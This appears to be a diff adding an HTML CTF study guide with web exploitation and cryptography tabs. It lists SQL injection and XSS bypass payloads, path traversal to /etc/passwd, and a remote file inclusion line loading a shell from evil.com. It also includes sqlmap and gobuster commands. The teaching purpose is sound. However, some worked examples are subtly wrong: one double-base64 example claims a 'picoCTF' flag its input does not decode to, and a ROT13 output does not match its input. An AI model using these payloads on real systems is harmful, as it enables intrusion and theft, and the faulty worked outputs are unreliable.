+                    <text x="55" y="72" text-anchor="middle" fill="white" font-size="8">View Source</text>
+                    <text x="55" y="82" text-anchor="middle" fill="white" font-size="8">robots.txt</text>
+                    
+                    <!-- Arrow 1 -->
+                    <path d="M 110 60 L 130 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#webArrow)"/>
+                    
+                    <!-- Step 2 -->
+                    <rect x="135" y="30" width="100" height="60" rx="8" fill="#9b59b6"/>
+                    <text x="185" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">ENUMERATE</text>
+                    <text x="185" y="72" text-anchor="middle" fill="white" font-size="8">Directories</text>
+                    <text x="185" y="82" text-anchor="middle" fill="white" font-size="8">Parameters</text>
+                    
+                    <!-- Arrow 2 -->
+                    <path d="M 240 60 L 260 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#webArrow)"/>
+                    
+                    <!-- Step 3 -->
+                    <rect x="265" y="30" width="100" height="60" rx="8" fill="#e67e22"/>
+                    <text x="315" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">IDENTIFY</text>
+                    <text x="315" y="72" text-anchor="middle" fill="white" font-size="8">Vulnerabilities</text>
+                    <text x="315" y="82" text-anchor="middle" fill="white" font-size="8">Input Points</text>
+                    
+                    <!-- Arrow 3 -->
+                    <path d="M 370 60 L 390 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#webArrow)"/>
+                    
+                    <!-- Step 4 -->
+                    <rect x="395" y="30" width="100" height="60" rx="8" fill="#e74c3c"/>
+                    <text x="445" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">EXPLOIT</text>
+                    <text x="445" y="72" text-anchor="middle" fill="white" font-size="8">SQLi, XSS</text>
+                    <text x="445" y="82" text-anchor="middle" fill="white" font-size="8">SSTI, SSRF</text>
+                    
+                    <!-- Arrow 4 -->
+                    <path d="M 500 60 L 520 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#webArrow)"/>
+                    
+                    <!-- Step 5 -->
+                    <rect x="525" y="30" width="100" height="60" rx="8" fill="#27ae60"/>
+                    <text x="575" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">EXTRACT</text>
+                    <text x="575" y="72" text-anchor="middle" fill="white" font-size="8">Flag</text>
+                    <text x="575" y="82" text-anchor="middle" fill="white" font-size="8">Data</text>
+                    
+                    <!-- Arrow Definition -->
+                    <defs>
+                        <marker id="webArrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <path d="M0,0 L0,6 L9,3 z" fill="#ecf0f1"/>
+                        </marker>
+                    </defs>
+                </svg>
+            </div>
+
+            <div class="alert-box alert-success">
+                <div class="alert-title">Essential Web Tools</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
+                    <div>
+                        <strong>Browser DevTools (F12)</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Inspect elements, network, console, storage</p>
+                    </div>
+                    <div>
+                        <strong>Burp Suite</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">HTTP proxy for intercepting/modifying requests</p>
+                    </div>
+                    <div>
+                        <strong>curl / wget</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Command-line HTTP requests</p>
+                    </div>
+                    <div>
+                        <strong>SQLMap</strong>
+                        <p style="margin: 0.25rem 0; font-size: 0.9rem;">Automated SQL injection testing</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>OWASP Top 10 Overview</h3>
+            <p>The OWASP Top 10 represents the most critical web application security risks. Many CTF challenges are based on these vulnerabilities.</p>
+
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c;">A01: Broken Access Control</h4>
+                    <p>Users can access unauthorized functions or data. Look for IDOR, path traversal, privilege escalation.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #e67e22;">
+                    <h4 style="color: #e67e22;">A02: Cryptographic Failures</h4>
+                    <p>Sensitive data exposed due to weak crypto. Check for hardcoded keys, weak algorithms, insecure storage.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #f1c40f;">
+                    <h4 style="color: #d4ac0d;">A03: Injection</h4>
+                    <p>SQL, NoSQL, OS command, LDAP injection. User input not properly sanitized before processing.</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">A04: Insecure Design</h4>
+                    <p>Flaws in design patterns. Missing security controls, improper error handling.</p>
+                </div>
+            </div>
+
+            <h3>SQL Injection (SQLi)</h3>
+            <p>One of the most common and dangerous vulnerabilities. Occurs when user input is incorporated into SQL queries without proper sanitization.</p>
+
+            <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #3498db; margin-top: 0;">Common SQL Injection Payloads</h4>
+                <div style="display: grid; gap: 1rem;">
+                    <div>
+                        <p style="color: #9b59b6; margin-bottom: 0.25rem; font-weight: bold;">Authentication Bypass:</p>
+                        <code style="display: block; padding: 0.5rem; background: #0d1117; border-radius: 4px;">
+                            ' OR '1'='1<br>
+                            ' OR '1'='1' --<br>
+                            admin'--<br>
+                            ' OR 1=1#
+                        </code>
+                    </div>
+                    <div>
+                        <p style="color: #9b59b6; margin-bottom: 0.25rem; font-weight: bold;">UNION-Based Injection:</p>
+                        <code style="display: block; padding: 0.5rem; background: #0d1117; border-radius: 4px;">
+                            ' UNION SELECT null, null, null--<br>
+                            ' UNION SELECT username, password FROM users--<br>
+                            ' UNION SELECT 1,2,3,4,5--
+                        </code>
+                    </div>
+                    <div>
+                        <p style="color: #9b59b6; margin-bottom: 0.25rem; font-weight: bold;">Boolean-Based Blind:</p>
+                        <code style="display: block; padding: 0.5rem; background: #0d1117; border-radius: 4px;">
+                            ' AND 1=1--  (returns normal)<br>
+                            ' AND 1=2--  (returns different/error)
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Worked Examples Section -->
+            <div style="background: linear-gradient(135deg, #0a2540 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #3498db;">
+                <h3 style="color: #3498db; margin-top: 0;"> Worked Example: SQL Injection Login Bypass</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You find a login page at <code>http://challenge.com/login</code>. The source shows it uses a SQL query to check credentials.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0;">
+                    <p style="color: #7ee787; margin: 0;">Step 1: Try a basic payload in the username field</p>
+                    <code style="color: #f0f6fc; display: block; margin-top: 0.5rem;">Username: admin' --<br>Password: anything</code>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0;">
+                    <p style="color: #7ee787; margin: 0;">Step 2: If that doesn't work, try OR-based bypass</p>
+                    <code style="color: #f0f6fc; display: block; margin-top: 0.5rem;">Username: ' OR '1'='1' --<br>Password: anything</code>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0;">
+                    <p style="color: #7ee787; margin: 0;">Step 3: Check for different comment styles</p>
+                    <code style="color: #f0f6fc; display: block; margin-top: 0.5rem;">' OR 1=1 #    (MySQL)<br>' OR 1=1 --   (PostgreSQL/MSSQL)</code>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Why it works:</strong> The query becomes <code>SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'</code>. The <code>--</code> comments out the password check!</p>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #0a2540 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #27ae60;">
+                <h3 style="color: #27ae60; margin-top: 0;"> Worked Example: Finding Hidden Endpoints</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> A web challenge gives you a simple website. Find the flag.</p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Check robots.txt</p>
+                    <p style="color: #f0f6fc;">$ curl http://challenge.com/robots.txt</p>
+                    <p style="color: #888;">User-agent: *<br>Disallow: /secret-admin-panel/</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: Visit the hidden path</p>
+                    <p style="color: #f0f6fc;">$ curl http://challenge.com/secret-admin-panel/</p>
+                    <p style="color: #888;">picoCTF{r0b0ts_4r3_y0ur_fr13nd}</p>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Pro tip:</strong> Also check <code>/sitemap.xml</code>, <code>/.git/</code>, <code>/backup/</code>, and view page source!</p>
+            </div>
+
+            <h3>Cross-Site Scripting (XSS)</h3>
+            <p>XSS allows attackers to inject client-side scripts into web pages viewed by other users.</p>
+
+            <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
+                <thead>
+                    <tr style="background: var(--header-bg); color: white;">
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Type</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Description</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Example Payload</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Reflected XSS</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Script in URL is reflected back</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Stored XSS</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Script stored in database</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>DOM-Based XSS</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Vulnerability in client-side JS</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>#&lt;img src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #e67e22; margin-top: 0;">XSS Filter Bypass Techniques</h4>
+                <code style="display: block; padding: 0.5rem; background: #0d1117; border-radius: 4px; font-size: 0.85rem;">
+                    &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;  // Case variation<br>
+                    &lt;img src=x onerror=alert(1)&gt;  // Event handlers<br>
+                    &lt;svg onload=alert(1)&gt;  // SVG tags<br>
+                    &lt;body onload=alert(1)&gt;  // Body events<br>
+                    javascript:alert(1)  // JavaScript protocol<br>
+                    &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;  // Char encoding
+                </code>
+            </div>
+
+            <h3>Directory Traversal / LFI / RFI</h3>
+            <p>Path traversal attacks attempt to access files outside the intended directory structure.</p>
+
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Local File Inclusion (LFI)</h4>
+                    <p>Include local files from the server</p>
+                    <code>?page=../../../etc/passwd</code><br>
+                    <code>?file=....//....//etc/passwd</code>
+                </div>
+                <div class="category-card">
+                    <h4>Remote File Inclusion (RFI)</h4>
+                    <p>Include remote malicious files</p>
+                    <code>?page=http://evil.com/shell.php</code><br>
+                    <code>?file=ftp://attacker/malware</code>
+                </div>
+                <div class="category-card">
+                    <h4>PHP Wrappers</h4>
+                    <p>Bypass restrictions using PHP streams</p>
+                    <code>?page=php://filter/convert.base64-encode/resource=index.php</code>
+                </div>
+                <div class="category-card">
+                    <h4>Null Byte Injection</h4>
+                    <p>Bypass extension checks (older PHP)</p>
+                    <code>?file=../../../etc/passwd%00</code>
+                </div>
+            </div>
+
+            <h3>Authentication & Session Attacks</h3>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
+                <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #3498db; margin-top: 0;">Cookie Manipulation</h4>
+                    <ul style="color: #b8c5d6; font-size: 0.9rem;">
+                        <li>Modify cookie values in DevTools</li>
+                        <li>Change <code>role=user</code> to <code>role=admin</code></li>
+                        <li>Decode Base64 encoded cookies</li>
+                        <li>Look for JWT tokens (three Base64 parts separated by dots)</li>
+                    </ul>
+                </div>
+                <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #9b59b6; margin-top: 0;">Session Hijacking</h4>
+                    <ul style="color: #b8c5d6; font-size: 0.9rem;">
+                        <li>Steal session tokens via XSS</li>
+                        <li>Session fixation attacks</li>
+                        <li>Predictable session IDs</li>
+                        <li>Session token in URL</li>
+                    </ul>
+                </div>
+                <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px;">
+                    <h4 style="color: #e67e22; margin-top: 0;">JWT Attacks</h4>
+                    <ul style="color: #b8c5d6; font-size: 0.9rem;">
+                        <li>Algorithm confusion (HS256 vs RS256)</li>
+                        <li>Set algorithm to "none"</li>
+                        <li>Weak secret brute-forcing</li>
+                        <li>Kid header injection</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Web Recon Checklist</h3>
+            <div class="alert-box alert-warning">
+                <div class="alert-title">Before You Exploit, Enumerate</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
+                    <ul>
+                        <li>View page source (Ctrl+U)</li>
+                        <li>Check robots.txt</li>
+                        <li>Check sitemap.xml</li>
+                        <li>Look for .git folders</li>
+                        <li>Check for backup files (.bak, ~, .old)</li>
+                        <li>Inspect JavaScript files</li>
+                    </ul>
+                    <ul>
+                        <li>Analyze cookies and localStorage</li>
+                        <li>Check HTTP headers</li>
+                        <li>Test all input fields</li>
+                        <li>Look for hidden form fields</li>
+                        <li>Check for API endpoints</li>
+                        <li>Analyze error messages</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>Essential Commands</h3>
+            <div style="background: #0d1117; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; font-family: monospace;">
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Directory brute-forcing</p>
+                <p style="color: #f0f6fc;">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># SQL injection with SQLMap</p>
+                <p style="color: #f0f6fc;">sqlmap -u "http://target.com/page?id=1" --dbs</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># cURL with custom headers</p>
+                <p style="color: #f0f6fc;">curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin</p>
+                <br>
+                <p style="color: #7ee787; margin-bottom: 0.5rem;"># Send POST request with data</p>
+                <p style="color: #f0f6fc;">curl -X POST -d "username=admin&password=test" http://target.com/login</p>
+            </div>
+
+            <!-- Related Resource Link -->
+            <div style="background: linear-gradient(135deg, #1e3a5f 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 12px; margin-top: 2rem; text-align: center; border: 1px solid #3498db;">
+                <h4 style="color: #3498db; margin-top: 0;">Practice Workshop</h4>
+                <p style="color: #b8c5d6; margin-bottom: 1rem;">Try our interactive Web Exploitation Workshop with real challenges.</p>
+                <a href="workshop-web.html" style="display: inline-block; background: #3498db; color: white; padding: 0.75rem 1.5rem; border-radius: 8px; text-decoration: none; font-weight: bold; transition: all 0.3s ease;">
+                    Launch Web Workshop
+                </a>
+            </div>
+        </section>
+        
+        <section id="tab-crypto" class="tab-content">
+            <h2>Cryptography</h2>
+            <p>Cryptography challenges test your understanding of encoding, encryption, and mathematical concepts. The key is to recognize patterns and understand the difference between encoding (reversible without a key) and encryption (requires a key).</p>
+
+            <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; text-align: center;">
+                <svg viewBox="0 0 600 120" style="max-width: 100%; height: auto;">
+                    <!-- Plaintext -->
+                    <rect x="10" y="35" width="100" height="50" rx="8" fill="#27ae60"/>
+                    <text x="60" y="65" text-anchor="middle" fill="white" font-weight="bold" font-size="12">Plaintext</text>
+                    
+                    <!-- Arrow to Encoding -->
+                    <path d="M 115 60 L 145 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowCrypto)"/>
+                    
+                    <!-- Encoding Box -->
+                    <rect x="150" y="35" width="100" height="50" rx="8" fill="#3498db"/>
+                    <text x="200" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">Encoding</text>
+                    <text x="200" y="72" text-anchor="middle" fill="white" font-size="9">(No key needed)</text>
+                    
+                    <!-- Arrow to Encryption -->
+                    <path d="M 255 60 L 285 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowCrypto)"/>
+                    
+                    <!-- Encryption Box -->
+                    <rect x="290" y="35" width="100" height="50" rx="8" fill="#9b59b6"/>
+                    <text x="340" y="55" text-anchor="middle" fill="white" font-weight="bold" font-size="11">Encryption</text>
+                    <text x="340" y="72" text-anchor="middle" fill="white" font-size="9">(Key required)</text>
+                    
+                    <!-- Arrow to Ciphertext -->
+                    <path d="M 395 60 L 425 60" stroke="#ecf0f1" stroke-width="2" marker-end="url(#arrowCrypto)"/>
+                    
+                    <!-- Ciphertext -->
+                    <rect x="430" y="35" width="100" height="50" rx="8" fill="#e74c3c"/>
+                    <text x="480" y="65" text-anchor="middle" fill="white" font-weight="bold" font-size="12">Ciphertext</text>
+                    
+                    <!-- Key symbol -->
+                    <text x="340" y="22" text-anchor="middle" fill="#f1c40f" font-size="14" font-weight="bold">KEY</text>
+                    
+                    <defs>
+                        <marker id="arrowCrypto" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <path d="M0,0 L0,6 L9,3 z" fill="#ecf0f1"/>
+                        </marker>
+                    </defs>
+                </svg>
+            </div>
+
+            <h3>Common Encoding Schemes</h3>
+            <p>Encoding transforms data into a different format. It's NOT encryption—anyone can decode it without a key.</p>
+
+            <table style="width: 100%; border-collapse: collapse; margin: 1.5rem 0;">
+                <thead>
+                    <tr style="background: var(--header-bg); color: white;">
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Encoding</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Characteristics</th>
+                        <th style="padding: 1rem; border: 1px solid var(--border-color);">Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Base64</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">A-Z, a-z, 0-9, +, /; ends with = or ==</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>ZmxhZ3toZWxsb30=</code></td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Base32</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">A-Z, 2-7; longer than Base64</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>MZXW6YTBOI======</code></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Hexadecimal</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">0-9, A-F only; often starts with 0x</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>666c61677b68656c6c6f7d</code></td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>Binary</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Only 0s and 1s; 8 bits per character</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>01100110 01101100 01100001 01100111</code></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>URL Encoding</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">%XX format for special characters</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>flag%7Bhello%7D</code></td>
+                    </tr>
+                    <tr style="background: var(--bg-main);">
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><strong>ASCII/Decimal</strong></td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);">Numbers representing characters</td>
+                        <td style="padding: 1rem; border: 1px solid var(--border-color);"><code>102 108 97 103</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <!-- Worked Examples Section -->
+            <div style="background: linear-gradient(135deg, #2d1a4e 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #9b59b6;">
+                <h3 style="color: #9b59b6; margin-top: 0;"> Worked Example: Decoding a Multi-Layer Encoded String</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You're given this string: <code>Y1dWelEwWlVlMmhsZURSZmJtOTBYMkpsYzNSZlltRnpaWDA9</code></p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Recognize Base64 (A-Z, a-z, 0-9, ends with =)</p>
+                    <p style="color: #f0f6fc;">$ echo "Y1dWelEwWlVlMmhsZURSZmJtOTBYMkpsYzNSZlltRnpaWDA9" | base64 -d</p>
+                    <p style="color: #888;">cWVzQ0ZUe2hleDRfbm90X2Jlc3RfYmFzZX0=</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 2: That's still Base64! Decode again</p>
+                    <p style="color: #f0f6fc;">$ echo "cWVzQ0ZUe2hleDRfbm90X2Jlc3RfYmFzZX0=" | base64 -d</p>
+                    <p style="color: #888;">picoCTF{hex4_not_best_base}</p>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Pro tip:</strong> Use CyberChef's "Magic" operation to auto-detect encoding layers!</p>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #2d1a4e 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #e67e22;">
+                <h3 style="color: #e67e22; margin-top: 0;"> Worked Example: Cracking a Caesar Cipher</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You find encrypted text: <code>cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDCA}</code></p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Step 1: Recognize the pattern - looks like picoCTF{...} shifted</p>
+                    <p style="color: #7ee787;"># 'cvpb' should be 'pico' - that's ROT13!</p>
+                    <p style="color: #f0f6fc;">$ echo "cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDCA}" | tr 'a-zA-Z' 'n-za-mN-ZA-M'</p>
+                    <p style="color: #888;">picoCTF{next_time_I'll_try_2_rounds_of_rot13_aFxtmQPN}</p>
+                </div>
+                
+                <p style="color: #f1c40f;"><strong>Key insight:</strong> If you see <code>PGS</code> in the ciphertext, it's likely ROT13 of <code>CTF</code>!</p>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #2d1a4e 0%, #1a1a2e 100%); padding: 2rem; border-radius: 12px; margin: 2rem 0; border: 2px solid #3498db;">
+                <h3 style="color: #3498db; margin-top: 0;"> Worked Example: Converting Between Number Bases</h3>
+                <p style="color: #b8c5d6;"><strong>Scenario:</strong> You're given: <code>0x70 0x69 0x63 0x6f 0x43 0x54 0x46</code></p>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Method 1: Using Python</p>
+                    <p style="color: #f0f6fc;">$ python3 -c "print(bytes.fromhex('7069636f435446').decode())"</p>
+                    <p style="color: #888;">picoCTF</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Method 2: Using xxd</p>
+                    <p style="color: #f0f6fc;">$ echo "7069636f435446" | xxd -r -p</p>
+                    <p style="color: #888;">picoCTF</p>
+                </div>
+                
+                <div style="background: #0d1117; padding: 1rem; border-radius: 8px; margin: 1rem 0; font-family: monospace;">
+                    <p style="color: #7ee787;"># Converting decimal ASCII to text</p>
+                    <p style="color: #f0f6fc;">$ python3 -c "print(''.join(chr(x) for x in [112, 105, 99, 111]))"</p>
+                    <p style="color: #888;">pico</p>
+                </div>
+            </div>
+
+            <h3>Classical Ciphers</h3>
+            <p>Historical ciphers that are still commonly found in CTF challenges. They're vulnerable to various attacks.</p>
+
+            <div class="category-grid">
+                <div class="category-card" style="border-left: 4px solid #e74c3c;">
+                    <h4 style="color: #e74c3c;">Caesar Cipher (ROT-N)</h4>
+                    <p>Shifts each letter by N positions. ROT13 is most common (shift by 13).</p>
+                    <p><strong>Attack:</strong> Try all 25 rotations or frequency analysis</p>
+                    <code>synt{uryyb} → flag{hello} (ROT13)</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #3498db;">
+                    <h4 style="color: #3498db;">Vigenère Cipher</h4>
+                    <p>Polyalphabetic cipher using a keyword to shift letters.</p>
+                    <p><strong>Attack:</strong> Kasiski examination, frequency analysis</p>
+                    <code>Key: "KEY" shifts each letter differently</code>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #27ae60;">
+                    <h4 style="color: #27ae60;">Substitution Cipher</h4>
+                    <p>Each letter replaced with another letter consistently.</p>
+                    <p><strong>Attack:</strong> Frequency analysis (E, T, A are most common)</p>
+                </div>
+                <div class="category-card" style="border-left: 4px solid #9b59b6;">
+                    <h4 style="color: #9b59b6;">Atbash Cipher</h4>
+                    <p>A=Z, B=Y, C=X... Reverses the alphabet.</p>
+                    <p><strong>Attack:</strong> Simple reversal; self-reciprocal</p>
+                </div>
+            </div>
+
+            <h3>XOR Encryption</h3>
+            <p>XOR (exclusive or) is a fundamental operation in cryptography. It's reversible: A ⊕ B ⊕ B = A</p>
+
+            <div style="background: #1a1a2e; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #f1c40f; margin-top: 0;">XOR Truth Table</h4>
+                <div style="display: flex; gap: 2rem; flex-wrap: wrap;">
+                    <table style="border-collapse: collapse;">
+                        <tr><th style="padding: 0.5rem; border: 1px solid #444; color: #3498db;">A</th><th style="padding: 0.5rem; border: 1px solid #444; color: #3498db;">B</th><th style="padding: 0.5rem; border: 1px solid #444; color: #27ae60;">A ⊕ B</th></tr>
+                        <tr><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td></tr>
+                        <tr><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td></tr>
+                        <tr><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td></tr>
+                        <tr><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">1</td><td style="padding: 0.5rem; border: 1px solid #444; color: white;">0</td></tr>
+                    </table>
+                    <div style="color: #b8c5d6;">
+                        <p><strong>Single-byte XOR:</strong> Try all 256 possible keys</p>
+                        <p><strong>Known plaintext:</strong> If you know part of the message, XOR to find key</p>
+                        <p><strong>Repeating key:</strong> Use frequency analysis on key positions</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>RSA Cryptography</h3>
+            <p>RSA is an asymmetric encryption algorithm widely used in CTFs. Understanding its math is crucial for solving crypto challenges.</p>
+
+            <div style="background: linear-gradient(135deg, #2d2d44 0%, #1a1a2e 100%); padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0;">
+                <h4 style="color: #3498db; margin-top: 0;">RSA Key Components</h4>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; color: #b8c5d6;">
+                    <div>
+                        <p><strong style="color: #27ae60;">n</strong> = p × q (modulus)</p>
+                        <p><strong style="color: #27ae60;">e</strong> = public exponent (often 65537)</p>
+                        <p><strong style="color: #27ae60;">d</strong> = private exponent</p>
+                    </div>
+                    <div>
+                        <p><strong style="color: #9b59b6;">φ(n)</strong> = (p-1)(q-1)</p>
+                        <p><strong style="color: #9b59b6;">Encrypt:</strong> c = m^e mod n</p>
+                        <p><strong style="color: #9b59b6;">Decrypt:</strong> m = c^d mod n</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="category-grid">
+                <div class="category-card">
+                    <h4>Small e Attack</h4>
+                    <p>If e=3 and m^3 < n, just take the cube root of ciphertext</p>
+                </div>
+                <div class="category-card">
+                    <h4>Factorization</h4>
+                    <p>If n is small or p,q are close, factor n to find private key</p>
+                </div>
+                <div class="category-card">
+                    <h4>Common Modulus</h4>
+                    <p>Same message encrypted with same n but different e values</p>
+                </div>
+                <div class="category-card">
